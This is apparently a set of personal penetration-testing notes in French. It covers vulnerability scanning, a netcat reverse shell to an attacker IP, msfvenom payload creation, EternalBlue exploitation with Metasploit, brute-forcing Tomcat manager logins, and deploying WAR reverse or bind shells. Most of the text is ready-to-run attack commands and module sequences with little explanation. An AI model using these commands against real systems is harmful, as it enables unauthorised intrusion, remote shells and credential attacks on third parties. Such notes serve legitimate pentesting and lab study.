```toc

```

# Scan de vuln
Utilisation de Greenbone (anciennement OpenVas) pour faire un scan sur les vulnérabilités connues.


# Exploitation
Recherche manuelle d'exploit disponibles sur internet, notamment dans la base *exploit database*.

Création d'un reverse shell :
1. Ecoute sur le pc de l'attaquant : `nc -nlvp 4444`
2. Connexion depuis la machine compromise : `nc <ip_attaquant> <por> -e /bin/sh`


## Metasploit
### Msfconsole
```bash
msfconsole
> search tomcat
> use auxiliary/scanner/http/tomcat_mgr_login
> show info
> set RHOST 172.30.12.51
> set RPORT 8080
> set ...
> run
```

### Msfvenom
Permet de créer des payloads
```bash
# List available payloads
msfvenom -l payloads

# List options of a payload
msfvenom --list-options -p windows/x64/shell/bind_tcp

# Create payload
msfvenom --payload linux/x86/shell_reverse_tcp LHOST=172.30.1.5 LPORT=4444 W > runme.war
```


# Exemples
## Eternal Blue
```bash
msfconsole
# FIND VULNERABLE HOSTS
> use auxiliary/scanner/smb/smb_ms17_010
> show options
> set RHOSTS 172.30.12.0/24
> set THREADS 5
> set SMBDomain
> set ...
> run

# EXPLOIT
> use exploit/windows/smb/ms17_010_eternalblue
> set ...
> set LHOST <my_ip>
> run

# IF IT WORKS
$ sysinfo
$ getuid


# ANOTHER EXPLOIT
> use exploit/windows/smb/ms17_010_psexec
> set payload windows/x64/meterpreter/reverse_tcp
```


## Tomcat
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat

```bash
msfconsole
> search tomcat

# Brute tomcat manager login
> use auxiliary/scanner/http/tomcat_mgr_login
> show info
> set RHOST 172.30.12.51
> set RPORT 8080
> set ...
> run

# Upload a file to execute
> use exploit/multi/http/tomcat_mgr_upload
> set ...
> show payloads
> set PAYLOAD <payload_nb>
```

Le fichier upload peut permettre d'avoir un bind shell ou un reverse shell. On peut l'upload à la main depuis la console de tomcat manager aussi.

Pour créer un payload "manuellement" : 
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=172.30.1.3 LPORT=4444 W > runme.war
```

Utilisation d'un script python pour générer le payload, le déployer et connecter le shell (c'est à peu près ce que fait metasploit aussi) :
https://github.com/mgeeky/tomcatWarDeployer
```bash
python3 tomcatWarDeployer.py --help

# For bind shell
python3 tomcatWarDeployer.py -U <user> -P <password> <target_ip>:<tomcat_port>
# For reverse shell
python3 tomcatWarDeployer.py -U <user> -P <password> -H <kaliip> -p <kali_listening_port> <target_ip>:<tomcat_port>
```

Si le bind et le reverse shell ne fonctionne pas, on peut toujours essayer de créer un webshell : https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#manual-method-web-shell
